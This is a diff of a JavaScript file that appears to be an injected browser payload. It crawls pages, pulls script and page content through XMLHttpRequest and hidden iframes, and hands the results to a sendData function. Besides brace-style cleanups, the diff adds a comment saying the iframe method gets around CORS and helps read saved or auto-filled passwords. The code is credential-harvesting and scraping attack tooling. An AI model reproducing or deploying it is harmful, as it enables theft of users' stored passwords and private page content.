@@ -4,7 +4,6 @@ var typeLink = "LINK";
 var typeScript = "SCRIPT";
 var typeForm = "FORM";
 var typeBrowser = "BROWSER";
-// var typeLocation = "LOCATION";
 
 // List of URLs that were already crawled. Used to prevent loops and unnecessary multiple extractions.
 var sentUrlList = [];
@@ -88,7 +87,9 @@ function processScripts(url, allScriptTags) {
                     if (xhr.readyState == XMLHttpRequest.DONE) {
                         if (xhr.status == 200) {
                             var content = xhr.responseText;
-                            if (typeof(content) == "undefined") content = "";
+                            if (typeof(content) == "undefined") {
+                                content = "";
+                            }
                             sendData(typeScript, { 'url': url, 'src': src, 'content': content });
                         }
                     }
@@ -102,6 +103,8 @@ function processScripts(url, allScriptTags) {
     }
 }
 
+// Fetch content of a given URL by loading it inside IFrame. This will be useful when AJAX based scraping is prevented due to 
+// CORS and also this will be useful in reading saved / auto-filled passwords.
 function iframeFetch(type, url, src) {
     try {
         var iframe = document.createElement('iframe');
@@ -112,7 +115,9 @@ function iframeFetch(type, url, src) {
                     && iframe.contentDocument.documentElement != null 
                     && iframe.contentDocument.documentElement.outerHTML != "") {
                     var content = iframe.contentDocument.documentElement.outerHTML;
-                    if (typeof(content) == "undefined") content = "";
+                    if (typeof(content) == "undefined") {
+                        content = "";
+                    }
                     if (type == typeContent && content != "") {
                         sendData(typeContent, { 'url': src, 'content': content });
                         // Once content is extracted try to gather more URLs from the extracted page.
